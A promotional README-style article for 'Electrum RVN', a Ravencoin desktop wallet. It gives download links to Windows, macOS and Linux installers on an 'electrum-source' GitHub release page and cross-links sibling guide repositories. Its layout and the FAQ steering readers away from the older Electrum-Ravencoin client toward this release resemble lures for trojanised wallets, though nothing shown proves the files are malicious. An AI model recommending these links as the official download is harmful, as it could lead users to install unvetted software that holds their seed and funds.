![Electrum RVN](assets/banner-article.png)

# What Is Electrum RVN? A Ravencoin Desktop Wallet Explained

<!-- compact-download-block -->

<p align="center">A light Ravencoin wallet that never downloads the chain</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Electrum RVN is a desktop wallet for Ravencoin. It connects to Electrum servers instead of downloading the Ravencoin blockchain, so it opens in seconds on an ordinary computer, and it holds native RVN assets as well as RVN itself. Keys stay on your machine, the wallet file is encrypted with a password you choose, and there is no account to create and no custodian holding your coins.

## What the wallet actually is

Electrum RVN is a light client for the Ravencoin network, written for Windows, macOS and Linux, and published as a desktop application rather than a web service. It is the same family of software as Bitcoin's Electrum: a small client that asks servers for the parts of the chain that concern your addresses, rather than storing the chain itself. The name carries the lineage and the network - Electrum for the client model, RVN for the coin it runs on.

That lineage is also where most confusion starts, so it is worth stating plainly: this is a Ravencoin wallet, not a Bitcoin wallet with a different logo. Ravencoin has its own chain, its own address prefix and its own asset layer, and none of those are shared with Bitcoin. If a guide tells you to import a Bitcoin seed into it and expect your BTC, the guide is about a different program. [Is Electrum RVN a Bitcoin wallet?](https://github.com/electrum-source/download-and-setup/blob/main/is-electrum-rvn-a-bitcoin-wallet.md) answers that question in full.

## How it works without the blockchain

The wallet keeps no copy of the chain. On first run it connects to one of the Electrum servers it is configured with, checks block headers with SPV proofs, and asks only for the transactions that touch your addresses. What that means in practice is a wallet that is ready in seconds, that keeps a small footprint on disk instead of the chain itself, and that depends on a server being reachable.

That dependency is the trade-off, and it is the one thing to understand before installing: a light client is only as connected as its server. When a server stops answering, the wallet looks stuck, and the fix is the server list rather than a reinstall. [Does Electrum RVN need a full node?](https://github.com/electrum-source/download-and-setup/blob/main/does-electrum-rvn-need-a-full-node.md) covers the other end of the same decision, including how to point the wallet at a node you already run.

## What it holds: RVN and Ravencoin assets

On Ravencoin, an asset is a native object on the chain rather than a token contract wrapped around someone else's network. Electrum RVN works with that layer directly: you can issue a named asset, create sub-assets under a parent name, issue a unique asset once, burn supply and reissue where the asset was created to allow it. The assets sit in the same wallet as the RVN that pays for them, which is why issuance and transfer are one workflow rather than two applications that have to agree about names.

## What it does with your keys

The seed is a standard BIP-39 twelve-word phrase, generated on your machine from operating-system entropy and never sent anywhere. The wallet file is encrypted with a password you choose, and private keys are decrypted in memory only while a signature is being produced. If you prefer a hardware wallet, Ledger and Trezor both work, and the keys stay on the device while the wallet builds and broadcasts the transaction. Multi-signature wallets - 2-of-3, 3-of-5 - and watch-only wallets are supported too, which is what makes a cold-storage setup possible without a second application.

There is no account, no email signup and no custodian. Nothing about the wallet can be reset by support, and nothing about it can be frozen by a third party. The seed is the backup and the only recovery path, which is the subject of [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) and of the whole backup sequence that starts with [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md).

## What it deliberately does not do

It does not run on a phone. Electrum RVN is desktop-only by design, and the download page offers no mobile build. A phone wallet is a reasonable place for a small float; the desktop wallet is where the balance that matters lives, and [Ravencoin mobile wallet vs Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-mobile-wallet-vs-electrum-rvn.md) explains the split rather than pretending it does not exist.

It does not download the chain, which is why [other Ravencoin wallets beside Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/other-ravencoin-wallets-beside-electrum-rvn.md) is a real comparison and not a formality: Ravencoin Core validates everything and holds the reference wallet, while this wallet trusts servers to answer honestly about your addresses and checks what it can.

It does not sell you anything. There is no in-wallet exchange, no staking, no interest and no price chart. Buying RVN happens somewhere else, and the withdrawal to an address you control is the part people get wrong, not the purchase.

## Who it is for

It suits a reader who holds RVN and wants the balance on their own machine, who may hold or issue RVN assets, and who would rather sign with a Ledger than trust a web wallet. It suits someone who has a laptop, not a server, and does not want a chain sync before the first transaction.

It does not suit a reader who needs a phone wallet, who wants a custodial service that can reset a password, or who wants to run a validating node - Ravencoin Core is the answer there.

## Getting started

Three steps, in this order: [install Electrum RVN on Windows, macOS or Linux](https://github.com/electrum-source/download-and-setup/blob/main/install-electrum-rvn-windows-macos-linux.md), [create a wallet in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/create-a-wallet-in-electrum-rvn.md) and write the twelve words down, then receive RVN at an address you control. Every step is also the answer to a question people ask before they start.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. If you are on an older build, updating is the first thing to try before any troubleshooting, because most connection and asset problems are already fixed there.

## FAQ

### Is Electrum RVN free?

Yes. The wallet is free to use, and its code base is MIT-licensed, read from the licence file in the repository rather than from a marketing page. That licence is the authority on what you may and may not do with the source.

### Does it store my coins?

No. Coins exist on the Ravencoin chain; the wallet stores the keys that can move them, encrypted on your disk. That distinction matters the moment you make a backup: copying the wallet file is copying keys, and the twelve words are the copy that survives a dead disk.

### Can I use it without an internet connection?

You can open it and read what it already knows, but it cannot see new blocks or broadcast a transaction offline. It signs locally, so an offline machine plus a watch-only wallet on a connected one is a working cold-storage pattern, and the one this wallet is built to support.

### Is it the same as the old Electrum-Ravencoin client?

It is the same lineage and the same idea, and the product people should be running is the one on the releases page today. Old builds are not what the guides describe, and the normal answer to any behaviour that looks wrong is to update to the current release: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

### Which platforms does it run on?

Windows 10 and 11, 64-bit; macOS 12 and later on Intel and Apple Silicon; and Linux. [Install Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/install-electrum-rvn-windows-macos-linux.md) has the platform detail.

<!-- related-articles -->

## Related articles

- [Is Electrum RVN a Bitcoin Wallet? What It Actually Runs On](https://github.com/electrum-source/download-and-setup/blob/main/is-electrum-rvn-a-bitcoin-wallet.md)
- [Does Electrum RVN Need a Full Node?](https://github.com/electrum-source/download-and-setup/blob/main/does-electrum-rvn-need-a-full-node.md)
- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
